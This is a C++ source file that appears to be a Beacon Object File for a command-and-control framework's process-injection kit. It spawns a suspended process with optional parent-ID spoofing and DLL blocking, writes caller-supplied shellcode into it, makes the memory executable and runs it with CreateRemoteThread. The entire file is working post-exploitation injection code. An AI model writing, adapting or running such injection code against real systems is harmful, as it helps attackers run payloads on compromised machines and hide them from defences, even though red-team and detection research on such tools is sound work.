#include <general.h>

// this define is mandatory
#define PS_INJECT_KIT

//
// arguments pass to bof:
//  1. spawnto process - BeaconDataExtract
//  2. parent id (config ppid) - BeaconDataInt
//  3. block dll policy (config blockdlls) - BeaconDataInt
//
extern "C" auto go( char* args, int argc ) -> void {
    datap parser = { 0 };

    BeaconDataParse( &parser, args, argc );

    NTSTATUS            status       = STATUS_SUCCESS; 
    PROCESS_INFORMATION process_info = { 0 };
    
    // need be first of youw own extracts
    status = KhpSpawntoProcess( &parser, CREATE_SUSPENDED, &process_info );
    if ( ! nt_success( status ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Process creation failure with error: (%d) %s", status, fmt_error( status ) );
        return;
    }

    INT32    shellcode_size  = 0;
    PBYTE    shellcode_buff  = (PBYTE)BeaconDataExtract( &parser, &shellcode_size );
    HANDLE   process_handle  = nullptr;
    LONG     error_code      = ERROR_SUCCESS;

    process_handle = process_info.hProcess;

    BeaconPrintfW( CALLBACK_OUTPUT, L"Spawned process with pid %d and tid %d", process_info.dwProcessId, process_info.dwThreadId );

    PVOID shellcode_ptr = VirtualAllocEx( process_handle, nullptr, shellcode_size, MEM_COMMIT, PAGE_READWRITE );
    if ( ! shellcode_ptr ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    SIZE_T bytes_written = 0;
    if ( ! WriteProcessMemory( process_handle, shellcode_ptr, shellcode_buff, shellcode_size, &bytes_written ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Write shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    ULONG old_protection = 0;
    if ( ! VirtualProtectEx( process_handle, shellcode_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protection ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    ULONG thread_id = 0;
    if ( ! CreateRemoteThread( process_handle, nullptr, 0, (LPTHREAD_START_ROUTINE)shellcode_ptr, nullptr, 0, &thread_id ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    BeaconPrintfW( CALLBACK_OUTPUT, L"Executing Shellcode in Thread ID: %d\n", thread_id );
}